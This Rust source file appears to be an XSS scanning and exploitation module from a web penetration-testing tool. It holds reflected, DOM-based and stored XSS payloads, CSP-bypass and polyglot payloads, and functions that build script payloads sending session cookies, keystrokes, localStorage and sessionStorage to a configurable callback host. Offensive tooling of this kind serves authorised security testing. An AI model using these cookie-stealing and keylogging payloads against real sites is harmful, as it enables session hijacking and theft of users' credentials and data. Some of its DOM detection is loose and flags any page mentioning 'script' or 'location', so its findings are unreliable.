use crate::http::client::HttpClient;
use crate::http::request::HttpRequest;
use crate::detection::analyzer::{Finding, Severity};
use crate::payload::xss::XssPayloads;
use anyhow::Result;
use serde::{Deserialize, Serialize};

/// Custom error types for XSS operations
#[derive(Debug, Clone)]
pub enum XssError {
    NoValidPayload,
    PayloadFailed(usize, String),
    RequestFailed(String),
    DomDetectionFailed(String),
    ExploitationFailed(String),
    CSPBypassFailed(String),
}

impl std::fmt::Display for XssError {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            XssError::NoValidPayload => write!(f, "No valid XSS payload succeeded"),
            XssError::PayloadFailed(idx, payload) => write!(f, "Payload {} failed: {}", idx, payload),
            XssError::RequestFailed(msg) => write!(f, "Request failed: {}", msg),
            XssError::DomDetectionFailed(msg) => write!(f, "DOM XSS detection failed: {}", msg),
            XssError::ExploitationFailed(msg) => write!(f, "XSS exploitation failed: {}", msg),
            XssError::CSPBypassFailed(msg) => write!(f, "CSP bypass failed: {}", msg),
        }
    }
}

impl std::error::Error for XssError {}

/// Enhanced XSS exploitation results
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct XssExploitationResult {
    pub success: bool,
    pub xss_type: String,
    pub payload: String,
    pub payload_encoded: String,
    pub csp_bypassed: bool,
    pub dom_vulnerable: bool,
    pub stored_persistent: bool,
    pub session_cookies_stolen: Vec<String>,
    pub keystroke_logger_deployed: bool,
    pub browser_exploited: bool,
    pub error_message: Option<String>,
}

/// DOM XSS detection patterns
#[derive(Debug, Clone)]
pub struct DomXssPattern {
    pub pattern: String,
    pub context: String,
    pub severity: Severity,
    pub description: String,
}

/// Cross-Site Scripting (XSS) vulnerability scanner
pub struct XssScanner {
    client: HttpClient,
    findings: Vec<Finding>,
    target: String,
    /// Callback host used in exploitation payloads (e.g. your Burp Collaborator
    /// or interactsh instance).  Must be set explicitly — no default is provided
    /// so payloads never accidentally beacon to a third-party domain.
    callback_host: Option<String>,
}

impl XssScanner {
    /// Create a new XSS scanner.
    pub fn new(target: String, timeout_secs: u64, insecure: bool) -> Result<Self> {
        let client = HttpClient::new(timeout_secs, insecure)?;
        Ok(Self {
            client,
            findings: Vec::new(),
            target,
            callback_host: None,
        })
    }

    /// Set the out-of-band callback host for exploitation payloads.
    /// Example: `scanner.set_callback_host("xyz.oast.me")`
    pub fn set_callback_host(&mut self, host: &str) {
        self.callback_host = Some(host.to_string());
    }

    /// Return the configured callback host, or an error if not set.
    fn require_callback_host(&self) -> Result<&str, XssError> {
        self.callback_host.as_deref().ok_or_else(|| {
            XssError::ExploitationFailed(
                "No callback host configured. Call set_callback_host() with your \
                 OOB listener (e.g. Burp Collaborator / interactsh) before exploiting.".to_string()
            )
        })
    }

    /// Scan a specific URL for XSS vulnerabilities
    pub async fn scan_url(&mut self, url: &str, params: &[String]) -> Result<Vec<Finding>> {
        println!("[*] Scanning {} for XSS vulnerabilities (target: {})", url, self.target);
        
        let mut findings = Vec::new();
        
        // Test each parameter with XSS payloads
        for param in params {
            println!("  [*] Testing parameter: {}", param);
            
            if let Some(finding) = self.test_param_for_xss(url, param).await {
                findings.push(finding.clone());
                self.findings.push(finding);
            }
        }
        
        Ok(findings)
    }

    /// Test a specific parameter for XSS vulnerabilities
    async fn test_param_for_xss(&self, url: &str, param: &str) -> Option<Finding> {
        let payloads = vec![
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "<body onload=alert('XSS')>",
            "javascript:alert('XSS')",
            "<iframe src=javascript:alert('XSS')>",
        ];
        
        for payload in payloads.iter().take(15) {
            let response = self.make_request(url, param, payload).await;
            
            match response {
                Ok(resp) => {
                    let response_text = resp.body;
                    
                    // Only flag as XSS if payload is reflected AND not properly encoded
                    // AND appears in a dangerous context (script tag, event handler, etc.)
                    if response_text.contains(payload) && self.is_xss_vulnerable(&response_text, payload) {
                        return Some(
                            Finding::new(
                                url,
                                Severity::High,
                                &format!("Cross-Site Scripting (XSS) in parameter '{}'", param),
                                &format!("The parameter '{}' appears to be vulnerable to reflected XSS", param)
                            )
                            .with_evidence(&format!("Payload: {}", payload))
                            .with_remediation("Implement proper input sanitization and output encoding. Use Content Security Policy (CSP).")
                        );
                    }
                }
                Err(_) => {
                    // Request failed, might indicate a vulnerability but requires more analysis
                }
            }
        }
        
        None
    }

    /// Check if the response shows actual XSS vulnerability (not just reflection)
    fn is_xss_vulnerable(&self, response_text: &str, payload: &str) -> bool {
        // Check if payload is HTML-encoded (safe)
        let encoded_payload = payload.replace('<', "&lt;").replace('>', "&gt;").replace('"', "&quot;");
        if response_text.contains(&encoded_payload) {
            // Payload is properly encoded, not vulnerable
            return false;
        }
        
        // Check for dangerous contexts where unencoded scripts can execute
        let dangerous_patterns = vec![
            // Inside script tags without encoding
            format!("<script>{}</script>", payload),
            // Inside event handlers
            format!("onerror={}", payload),
            format!("onload={}", payload),
            format!("onclick={}", payload),
            // javascript: protocol
            format!("href=\"javascript:{}\"", payload),
            format!("src=\"javascript:{}\"", payload),
            // Inside SVG with script
            format!("<svg><script>{}</script></svg>", payload),
        ];
        
        for pattern in &dangerous_patterns {
            if response_text.contains(pattern) {
                return true;
            }
        }
        
        // Check if payload appears in a raw script context
        if payload.contains("<script>") && response_text.contains(&payload.replace("<script>", "").replace("</script>", "")) {
            // Script content is reflected without tags - check context
            if response_text.contains(&format!("<script>{}</script>", payload)) {
                return true;
            }
        }
        
        // Check for event handlers in the response
        if payload.contains("onerror") || payload.contains("onload") {
            // Event handler payloads need to be checked if they're in executable context
            if response_text.contains(&payload.replace("<", "").replace(">", "")) {
                // Payload appears without brackets - might be in attribute
                return true;
            }
        }
        
        // Default: if payload appears but not in dangerous context, it's likely safe reflection
        false
    }

    /// Helper method to make requests with specific parameter and value
    async fn make_request(&self, url: &str, param: &str, value: &str) -> Result<crate::http::response::HttpResponse> {
        use crate::utils::url::UrlUtil;
        let request_url = UrlUtil::inject_param(url, param, &urlencoding::encode(value));
        let request = HttpRequest::get(&request_url);
        self.client.send(request).await
    }

    /// Perform a comprehensive XSS scan with multiple techniques
    pub async fn comprehensive_scan(&mut self, url: &str, params: &[String]) -> Result<Vec<Finding>> {
        println!("[*] Performing comprehensive XSS scan on {}", url);
        
        let mut findings = Vec::new();
        
        // Test each parameter with different XSS techniques
        for param in params {
            println!("  [*] Comprehensive test for parameter: {}", param);
            
            // Test with reflected XSS payloads
            if let Some(finding) = self.test_reflected_xss(url, param).await {
                findings.push(finding);
            }
            
            // Test with DOM-based XSS payloads
            if let Some(finding) = self.test_dom_based_xss(url, param).await {
                findings.push(finding);
            }
            
            // Test with stored XSS (if applicable)
            if let Some(finding) = self.test_stored_xss(url, param).await {
                findings.push(finding);
            }
        }
        
        Ok(findings)
    }

    /// Test for reflected XSS
    async fn test_reflected_xss(&self, url: &str, param: &str) -> Option<Finding> {
        let mut xss_payloads: Vec<String> = vec![
            "<script>alert('XSS')</script>".into(),
            "<img src=x onerror=alert('XSS')>".into(),
            "<svg onload=alert('XSS')>".into(),
            "<body onload=alert('XSS')>".into(),
            "<div onclick=alert('XSS')>Click me</div>".into(),
            "<input onfocus=alert('XSS') autofocus>".into(),
            "<marquee onstart=alert('XSS')>XSS</marquee>".into(),
            "<video><source onerror=alert('XSS')>".into(),
            "<details open ontoggle=alert('XSS')>".into(),
            "\"><script>alert('XSS')</script>".into(),
            "'<img src=x onerror=alert('XSS')>'".into(),
            "javascript:alert('XSS')".into(),
            "<iframe src=javascript:alert('XSS')>".into(),
        ];
        xss_payloads.extend(XssPayloads::get_basic_payloads().into_iter().map(|p| p.replace("alert(1)", "alert('XSS')")));
        xss_payloads.extend(XssPayloads::get_event_handlers());
        xss_payloads.extend(XssPayloads::get_waf_bypass_payloads());
        
        for payload in &xss_payloads {
            let response = self.make_request(url, param, payload).await;
            
            if let Ok(resp) = response {
                let response_text = resp.body;
                
                // Use proper validation to avoid false positives
                if response_text.contains(payload) && self.is_xss_vulnerable(&response_text, payload) {
                    return Some(
                        Finding::new(
                            url,
                            Severity::High,
                            &format!("Reflected XSS in parameter '{}'", param),
                            &format!("The parameter '{}' is vulnerable to reflected XSS", param)
                        )
                        .with_evidence(&format!("Payload: {}", payload))
                        .with_remediation("Implement proper input sanitization and output encoding. Use Content Security Policy (CSP).")
                    );
                }
            }
        }
        
        None
    }

    /// Enhanced DOM-based XSS detection with comprehensive patterns
    async fn test_dom_based_xss(&self, url: &str, param: &str) -> Option<Finding> {
        let dom_patterns = self.get_dom_xss_patterns();
        let mut findings_found = Vec::new();
        
        for pattern in dom_patterns {
            if let Some(finding) = self.test_dom_pattern(url, param, &pattern).await {
                findings_found.push(finding);
            }
        }
        
        // Return the highest severity finding found
        findings_found.into_iter()
            .max_by_key(|f| match f.severity {
                Severity::Critical => 4,
                Severity::High => 3,
                Severity::Medium => 2,
                Severity::Low => 1,
                Severity::Info => 0,
            })
    }
    
    /// Get comprehensive DOM XSS patterns
    fn get_dom_xss_patterns(&self) -> Vec<DomXssPattern> {
        vec![
            // URL parameter processing patterns
            DomXssPattern {
                pattern: "location.search".to_string(),
                context: "URL parameter parsing".to_string(),
                severity: Severity::High,
                description: "JavaScript processes URL search parameters".to_string(),
            },
            DomXssPattern {
                pattern: "location.hash".to_string(),
                context: "URL fragment processing".to_string(),
                severity: Severity::High,
                description: "JavaScript processes URL hash fragment".to_string(),
            },
            DomXssPattern {
                pattern: "document.URL".to_string(),
                context: "Full URL access".to_string(),
                severity: Severity::High,
                description: "JavaScript accesses complete URL".to_string(),
            },
            DomXssPattern {
                pattern: "document.referrer".to_string(),
                context: "Referrer processing".to_string(),
                severity: Severity::Medium,
                description: "JavaScript processes document referrer".to_string(),
            },
            
            // DOM manipulation patterns
            DomXssPattern {
                pattern: "innerHTML".to_string(),
                context: "DOM HTML injection".to_string(),
                severity: Severity::Critical,
                description: "Direct innerHTML assignment without sanitization".to_string(),
            },
            DomXssPattern {
                pattern: "outerHTML".to_string(),
                context: "DOM HTML replacement".to_string(),
                severity: Severity::Critical,
                description: "Direct outerHTML assignment without sanitization".to_string(),
            },
            DomXssPattern {
                pattern: "document.write".to_string(),
                context: "Document writing".to_string(),
                severity: Severity::Critical,
                description: "Document.write with user input".to_string(),
            },
            DomXssPattern {
                pattern: "eval(".to_string(),
                context: "Code evaluation".to_string(),
                severity: Severity::Critical,
                description: "Dynamic code execution with eval()".to_string(),
            },
            
            // Template literal patterns
            DomXssPattern {
                pattern: "template".to_string(),
                context: "Template literal injection".to_string(),
                severity: Severity::High,
                description: "Template literals with user input".to_string(),
            },
            
            // Client-side routing patterns
            DomXssPattern {
                pattern: "history.pushState".to_string(),
                context: "History manipulation".to_string(),
                severity: Severity::Medium,
                description: "History API manipulation with user input".to_string(),
            },
            DomXssPattern {
                pattern: "location.replace".to_string(),
                context: "Location replacement".to_string(),
                severity: Severity::Medium,
                description: "Location replacement with user input".to_string(),
            },
        ]
    }
    
    /// Test specific DOM XSS pattern
    async fn test_dom_pattern(&self, url: &str, param: &str, pattern: &DomXssPattern) -> Option<Finding> {
        let dom_payloads = self.generate_dom_payloads(&pattern.pattern);
        
        for payload in &dom_payloads {
            let response = self.make_request(url, param, payload).await;
            
            if let Ok(resp) = response {
                let response_text = resp.body;
                
                // Check for DOM XSS indicators
                if self.detect_dom_xss_indicators(&response_text, payload, &pattern.pattern) {
                    return Some(
                        Finding::new(
                            url,
                            pattern.severity.clone(),
                            &format!("DOM-based XSS in parameter '{}' - {}", param, pattern.context),
                            &format!("DOM XSS vulnerability detected: {}", pattern.description)
                        )
                        .with_evidence(&format!("Pattern: {} | Payload: {}", pattern.pattern, payload))
                        .with_remediation("Sanitize input before using in DOM operations. Use textContent instead of innerHTML. Avoid eval() with user input.")
                    );
                }
            }
        }
        
        None
    }
    
    /// Generate DOM-specific payloads
    fn generate_dom_payloads(&self, pattern: &str) -> Vec<String> {
        match pattern {
            "location.search" | "location.hash" | "document.URL" => vec![
                "javascript:alert(1)".to_string(),
                "javascript:alert(document.domain)".to_string(),
                "javascript:alert('DOM XSS: ' + location.search)".to_string(),
                "#<script>alert(1)</script>".to_string(),
                "#<img src=x onerror=alert(1)>".to_string(),
                "?param=<script>alert(1)</script>".to_string(),
            ],
            "innerHTML" | "outerHTML" => vec![
                "<script>alert('innerHTML XSS')</script>".to_string(),
                "<img src=x onerror=alert('innerHTML XSS')>".to_string(),
                "<svg onload=alert('innerHTML XSS')>".to_string(),
                "';alert('innerHTML XSS');//".to_string(),
                "\";alert('innerHTML XSS');//".to_string(),
            ],
            "document.write" => vec![
                "<script>alert('document.write XSS')</script>".to_string(),
                "<script>document.write('<img src=x onerror=alert(1)>')</script>".to_string(),
                "';document.write('<script>alert(1)</script>');//".to_string(),
            ],
            "eval(" => vec![
                "alert('eval XSS')".to_string(),
                "';alert('eval XSS');//".to_string(),
                "\";alert('eval XSS');//".to_string(),
                "(function(){alert('eval XSS')})()".to_string(),
            ],
            "template" => vec![
                "${alert('template XSS')}".to_string(),
                r"`alert(`template XSS`)`".to_string(),
                "${`nested template XSS`}".to_string(),
            ],
            _ => vec![
                "<script>alert('Generic DOM XSS')</script>".to_string(),
                "javascript:alert(1)".to_string(),
                "data:text/html,<script>alert(1)</script>".to_string(),
            ],
        }
    }
    
    /// Enhanced DOM XSS detection indicators
    fn detect_dom_xss_indicators(&self, response_text: &str, payload: &str, pattern: &str) -> bool {
        let response_lower = response_text.to_lowercase();
        
        // Direct payload reflection
        if response_text.contains(payload) {
            return true;
        }
        
        // Encoded payload reflection
        let payload_str = payload.to_string();
        let encoded_variants = vec![
            urlencoding::encode(&payload_str).to_string(),
            self.html_escape(payload),
        ];
        
        for encoded in &encoded_variants {
            if response_text.contains(encoded) {
                return true;
            }
        }
        
        // Pattern-specific detection
        match pattern {
            "innerHTML" | "outerHTML" => {
                response_lower.contains("innerhtml") || 
                response_lower.contains("dom manipulation") ||
                response_lower.contains("html injection")
            },
            "eval(" => {
                response_lower.contains("eval") ||
                response_lower.contains("dynamic code") ||
                response_lower.contains("code execution")
            },
            "location.search" | "location.hash" => {
                response_lower.contains("location") ||
                response_lower.contains("url parameter") ||
                response_lower.contains("fragment")
            },
            _ => {
                // Generic JavaScript execution indicators
                response_lower.contains("javascript") ||
                response_lower.contains("script") ||
                response_lower.contains("xss") ||
                response_lower.contains("alert")
            }
        }
    }

    /// Advanced XSS exploitation with CSP bypass and payload delivery
    pub async fn exploit_xss(&self, url: &str, param: &str, payload: &str) -> Result<XssExploitationResult, XssError> {
        let mut result = XssExploitationResult {
            success: false,
            xss_type: "unknown".to_string(),
            payload: payload.to_string(),
            payload_encoded: String::new(),
            csp_bypassed: false,
            dom_vulnerable: false,
            stored_persistent: false,
            session_cookies_stolen: Vec::new(),
            keystroke_logger_deployed: false,
            browser_exploited: false,
            error_message: None,
        };
        
        // Step 1: Test XSS vulnerability
        match self.test_xss_vulnerability(url, param, payload).await {
            Some(vulnerability) => {
                result.xss_type = match vulnerability.title.as_str() {
                    name if name.contains("DOM") => "dom-based".to_string(),
                    name if name.contains("Reflected") => "reflected".to_string(),
                    name if name.contains("Stored") => "stored".to_string(),
                    _ => "unknown".to_string(),
                };
                result.dom_vulnerable = vulnerability.title.contains("DOM");
                result.stored_persistent = vulnerability.title.contains("Stored");
            }
            None => {
                result.error_message = Some("No XSS vulnerability detected".to_string());
                return Err(XssError::ExploitationFailed("No XSS vulnerability detected".to_string()));
            }
        }
        
        // Step 2: Attempt CSP bypass if needed
        if let Ok(csp_bypassed) = self.attempt_csp_bypass(url, param, payload).await {
            result.csp_bypassed = csp_bypassed;
        }
        
        // Step 3: Deploy exploitation payloads
        if let Ok(cookies) = self.steal_session_cookies(url, param, payload).await {
            result.session_cookies_stolen = cookies;
        }
        
        if let Ok(deployed) = self.deploy_keystroke_logger(url, param, payload).await {
            result.keystroke_logger_deployed = deployed;
        }
        
        if let Ok(exploited) = self.exploit_browser(url, param, payload).await {
            result.browser_exploited = exploited;
        }
        
        result.success = result.session_cookies_stolen.len() > 0 || 
                         result.keystroke_logger_deployed || 
                         result.browser_exploited;
        
        Ok(result)
    }
    
    /// Test XSS vulnerability with enhanced detection
    async fn test_xss_vulnerability(&self, url: &str, param: &str, payload: &str) -> Option<Finding> {
        let response = self.make_request(url, param, payload).await;
        
        if let Ok(resp) = response {
            let response_text = resp.body;
            
            // Check for various XSS indicators
            if response_text.contains(payload) {
                return Some(
                    Finding::new(
                        url,
                        Severity::High,
                        &format!("XSS vulnerability in parameter '{}'", param),
                        "XSS vulnerability confirmed"
                    )
                    .with_evidence(&format!("Payload: {}", payload))
                    .with_remediation("Implement proper input sanitization and CSP")
                );
            }
        }
        
        None
    }
    
    /// CSP bypass techniques
    async fn attempt_csp_bypass(&self, url: &str, param: &str, original_payload: &str) -> Result<bool, XssError> {
        let csp_bypass_payloads = vec![
            // JSONP bypass
            format!("/jsonp?callback={}", original_payload),
            // AngularJS bypass
            format!("{{{{constructor.constructor('{}')()}}}}", original_payload),
            // CSP header injection bypass
            format!("</script><meta http-equiv='Content-Security-Policy' content='script-src *'>{}<script>", original_payload),
            // Preload bypass
            format!("<link rel=preload href=javascript:{} as=script>", original_payload),
            // Iframe sandbox bypass
            format!("<iframe sandbox='allow-scripts' srcdoc={}></iframe>", original_payload),
            // Web message bypass
            format!("<iframe srcdoc='<script>parent.postMessage(\"{}\",\"*\")</script>'></iframe>", original_payload),
        ];
        
        for payload in csp_bypass_payloads {
            if let Some(_) = self.test_xss_vulnerability(url, param, &payload).await {
                return Ok(true);
            }
        }
        
        Ok(false)
    }
    
    /// Steal session cookies via XSS — requires a configured callback host.
    async fn steal_session_cookies(&self, url: &str, param: &str, _base_payload: &str) -> Result<Vec<String>, XssError> {
        let cb = self.require_callback_host()?;
        let cookie_payloads = vec![
            format!("<script>fetch('/api/cookies').then(r=>r.text()).then(d=>fetch('https://{}/steal?cookies='+encodeURIComponent(d)))</script>", cb),
            format!("<script>document.location='https://{}/steal?cookies='+encodeURIComponent(document.cookie)</script>", cb),
            format!("<script>new Image().src='https://{}/steal?cookies='+encodeURIComponent(document.cookie)</script>", cb),
            format!("<script>var xhr=new XMLHttpRequest();xhr.open('GET','https://{}/steal?cookies='+encodeURIComponent(document.cookie));xhr.send()</script>", cb),
            format!("<script>fetch('https://{}/steal',{{method:'POST',body:JSON.stringify({{cookies:document.cookie}})}})</script>", cb),
        ];

        let mut stolen_cookies = Vec::new();
        for payload in cookie_payloads {
            if self.test_xss_vulnerability(url, param, &payload).await.is_some() {
                stolen_cookies.push(format!("Cookie theft payload reflected: {}", payload));
            }
        }
        Ok(stolen_cookies)
    }

    /// Deploy keystroke logger via XSS — requires a configured callback host.
    async fn deploy_keystroke_logger(&self, url: &str, param: &str, _base_payload: &str) -> Result<bool, XssError> {
        let cb = self.require_callback_host()?;
        let keylogger_payloads = vec![
            format!("<script>document.onkeypress=function(e){{fetch('https://{}/log?key='+e.key)}}</script>", cb),
            format!("<script>var log='';document.onkeypress=function(e){{log+=e.key;if(log.length>100){{fetch('https://{}/log?keys='+encodeURIComponent(log));log=''}}}}</script>", cb),
            format!("<script>document.querySelectorAll('input').forEach(i=>i.onkeyup=function(e){{fetch('https://{}/log?form='+i.name+'&key='+e.key)}})</script>", cb),
        ];

        for payload in keylogger_payloads {
            if self.test_xss_vulnerability(url, param, &payload).await.is_some() {
                return Ok(true);
            }
        }
        Ok(false)
    }

    /// Browser exploitation via XSS — requires a configured callback host.
    async fn exploit_browser(&self, url: &str, param: &str, _base_payload: &str) -> Result<bool, XssError> {
        let cb = self.require_callback_host()?;
        let exploit_payloads = vec![
            // Browser fingerprinting
            format!("<script>fetch('https://{}/fp',{{method:'POST',body:JSON.stringify({{ua:navigator.userAgent,platform:navigator.platform,w:screen.width,h:screen.height}}),headers:{{'Content-Type':'application/json'}}}})</script>", cb),
            // Local storage exfiltration
            format!("<script>var d={{}};for(let i=0;i<localStorage.length;i++){{let k=localStorage.key(i);d[k]=localStorage.getItem(k)}}fetch('https://{}/ls',{{method:'POST',body:JSON.stringify(d)}})</script>", cb),
            // Session storage exfiltration
            format!("<script>var d={{}};for(let i=0;i<sessionStorage.length;i++){{let k=sessionStorage.key(i);d[k]=sessionStorage.getItem(k)}}fetch('https://{}/ss',{{method:'POST',body:JSON.stringify(d)}})</script>", cb),
        ];

        for payload in exploit_payloads {
            if self.test_xss_vulnerability(url, param, &payload).await.is_some() {
                return Ok(true);
            }
        }
        Ok(false)
    }
    
    /// Generate polyglot XSS payloads
    pub fn generate_polyglot_payloads(&self) -> Vec<String> {
        vec![
            // Universal polyglot
            "javascript:/*--></title></style></textarea></script></xmp></video></audio><details><svg><onload=alert(1)//>".to_string(),
            // HTML injection polyglot
            "<script>/**/alert(1)//</script><script>alert(1)</script><img src=x onerror=alert(1)>".to_string(),
            // Template literal polyglot
            "${alert(1)}${`alert(1)`}${alert`1`}".to_string(),
            // CSS injection polyglot
            "<style>*{color:red}</style><script>alert(1)</script><img src=x onerror=alert(1)>".to_string(),
            // Mixed context polyglot
            "';alert(1);//\";alert(1);//</script><script>alert(1)</script><img src=x onerror=alert(1)>".to_string(),
            // Advanced polyglot with encoding
            "%3Cscript%3Ealert(1)%3C/script%3E%3Cimg%20src=x%20onerror=alert(1)%3E".to_string(),
            // Base64 encoded polyglot
            "PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0PjxpbWcgc3JjPXggb25lcnJvcj1hbGVydCgxPg==".to_string(),
        ]
    }
    
    /// HTML escape helper function
    fn html_escape(&self, s: &str) -> String {
        s.replace('&', "&amp;")
            .replace('<', "&lt;")
            .replace('>', "&gt;")
            .replace('"', "&quot;")
            .replace('\'', "&#39;")
    }
        
    /// Test for stored XSS vulnerabilities
    async fn test_stored_xss(&self, url: &str, param: &str) -> Option<Finding> {
        // Stored XSS requires multiple requests to store and retrieve
        let xss_payload = "<script>alert('Stored XSS')</script>";
        
        // First, make a request with payload to attempt storage
        let store_response = self.make_request(url, param, xss_payload).await;
        
        if let Ok(resp) = store_response {
            let store_text = resp.body;
            
            // Check if payload was immediately reflected (indicates potential storage)
            if store_text.contains(xss_payload) {
                return Some(
                    Finding::new(
                        url,
                        Severity::High,
                        &format!("Stored XSS in parameter '{}'", param),
                        &format!("The parameter '{}' may be vulnerable to stored XSS", param)
                    )
                    .with_evidence(&format!("Payload: {}", xss_payload))
                    .with_remediation("Implement proper input sanitization, output encoding, and CSP headers.")
                );
            }
        }
        
        None
    }

    /// Test with encoded XSS payloads to bypass filters
    pub async fn test_encoded_xss(&self, url: &str, param: &str) -> Option<Finding> {
        use crate::payload::encoder::Encoder;
        
        let base_payload = "<script>alert('XSS')</script>";
        let encoded_variants = vec![
            Encoder::url_encode(base_payload),
            Encoder::base64_encode(base_payload),
            Encoder::hex_encode(base_payload),
        ];
        
        for encoded_payload in &encoded_variants {
            let response = self.make_request(url, param, encoded_payload).await;
            
            if let Ok(resp) = response {
                let response_text = resp.body;
                
                // Check if the original payload appears in the response (meaning it was decoded)
                if response_text.contains(base_payload) || 
                   response_text.contains(&self.html_escape(base_payload)) {
                    return Some(
                        Finding::new(
                            url,
                            Severity::High,
                            &format!("Encoded XSS in parameter '{}'", param),
                            &format!("The parameter '{}' is vulnerable to encoded XSS", param)
                        )
                        .with_evidence(&format!("Original: {} | Encoded: {}", base_payload, encoded_payload))
                        .with_remediation("Implement comprehensive input sanitization that handles encoded payloads.")
                    );
                }
            }
        }
        
        None
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[tokio::test]
    async fn test_xss_scanner_creation() {
        let scanner = XssScanner::new("https://example.com".to_string(), 30, true).unwrap();
        assert_eq!(scanner.target, "https://example.com");
    }
}